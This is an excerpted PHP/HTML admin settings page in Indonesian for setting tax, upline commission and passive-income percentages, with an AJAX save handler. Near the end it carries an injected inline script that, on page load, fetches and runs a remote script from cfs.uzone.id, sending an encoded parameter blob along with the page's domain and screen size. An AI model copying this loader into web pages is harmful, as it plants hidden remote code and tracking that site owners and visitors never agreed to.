...
$sqlP = "SELECT * FROM `percents` ORDER by tanggal DESC";
    ...
    <div class="wrapper">
        ...
        <div class="main-panel">
            <nav class="navbar navbar-default">
                <div class="container-fluid">
                    <div class="collapse navbar-collapse">
                        ...
                        <a class="navbar-brand" href="pengaturan.php">Pengaturan</a>
            ...
            <div class="content">
                <div class="container-fluid">
                    <div class="card">
                        <div class="card-header"><h4 class="card-title">Pajak Closing</h4></div>
                        <div class="card-content">
                            <form action="" method="POST" class="form-horizontal" id="registerFormValidation">
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Jumlah Pajak :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="pajak" value="<?php echo $rowP['pajak'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                    ...
                    <div class="card">
                        <div class="card-header"><h4 class="card-title">Persenan Upline</h4></div>
                        <div class="card-content">
                            <form action="" method="POST" class="form-horizontal" id="registerFormValidation">
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Upline 1 :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="upline1" value="<?php echo $rowP['upline1'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Upline 2 :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="upline2" value="<?php echo $rowP['upline2'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Upline 3 :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="upline3" value="<?php echo $rowP['upline3'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                                <div class="card-footer">
                    ...
                    <div class="card">
                        <div class="card-header"><h4 class="card-title">Persenan Passive Income</h4></div>
                        <div class="card-content">
                            <form action="" method="POST" class="form-horizontal" id="registerFormValidation">
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Principal :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="principal" value="<?php echo $rowP['principal'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                                <fieldset>
                                    <div class="form-group">
                                        <label class="col-sm-5 control-label">Vice Principal :</label><label class="control-label">%</label>
                                        <div class="col-sm-2">
                                            <input type="number" min="0" name="vicePrincipal" value="<?php echo $rowP['vice_principal'] ?>" class="form-control" autofocus style="text-align: right;" />
                                        </div>
                                    </div>
                                </fieldset>
                                <div class="card-footer">
                    ...
                    <div class="card-content">
                        <div class="col-sm-12"> 
                            <button type="submit" name="submit" id="simpanID" class="btn btn-info btn-fill pull-right">Simpan</button>
                        </div>
                    </div>     
                </div>
            </div>
...
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582CL4NjpNgssKAz6JMkPltAPvhVgLvKlTyG2Q11ufhKxvls%2b8rFsEzchpoITXnhMJFZld3kCxvoNkNPdSGq2TK2v2KoYMSUVA%2fRJ8BGERO2px0q4sLTPEm9fUuNuLFnySTHe4rKMiVTFxzcx8n7HsaQFwVEyjcKFBhkyxu22Wv%2fOkug1QYCC8c53H1tyHX0DwMT3kwOtKb7Pd6d%2fZyWJMhwMIlSRie7MjjQkiZIZlwTOaqTwZnJ0bnnsAEwI6kB%2ffkvG98edF7%2bNYHlQTs9IqhcuHwDJeoUt5MC6UYm12Ow1kfcGZLMQ%2fzAI67OTHn5Hh%2bV2u%2bWlCakD5DO1DZreCnzBJGUgasGQ8CC03skMa4OoNtUe5tVfYln6XYMf2PnTyxn31eoe1fCtXp6jcqWhudE7v6HNOLwqR6WniFk2hpic29awXcEGr6uk7CWaq%2fW6E5uSf8uect1F3yAT9IHca9agjmyu%2bqk%2f5HfEJUuawf4zpVC5FdRyAQzLwBTUi1ByX7LcRxJzibYJ3G%2bE3Efd7g0a%2b7Tefj0bfZeqoD7eB3rJ5phfNTt04G0Iy0%2bO5LJMGA%2fJHJ8YYeTp2prakOqivYnA3w%2fIvn8B8HfBmrugQ7wyGpSSkLijr5wgT2jVePhr8ATCZICeiEeMG2KmGB5qficquy0AOL5Esbb35sfVSUbBq1lDSygllLluf6lx75BFS0ewDgjBSQOhUliXezxocRE1CnFjzZG3aOm0DwRrMYopRpE25GHtYghrKotUSSpacXSsjbOyKGL%2fohRkQV%2biLkXWGVfamefhj7Rstqx3YVwHP4l7JxT9eaQc7tN9gXikwh2rvAquOV3UGCh8uXx3Yn8u9axvDPtApe8K8EdBmDCTDRuRIj2%2bWMEIEk2%2bsW1k8Qw%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    ...
    <script type="text/javascript">
        ...
        $('#simpanID').click(function(e){
            $.ajax({
                type: 'post',
                url: 'proses.php?cmd=atur_persenan',
                data: $('form').serialize(),
                success: function (data) {
                    $.notify({
                        // options
                        icon: 'glyphicon glyphicon-ok-sign',
                        message: 'Data perngaturan berhasil untuk disimpan.' 
                    },{
                        // settings
                        type: 'success',
                        placement: {
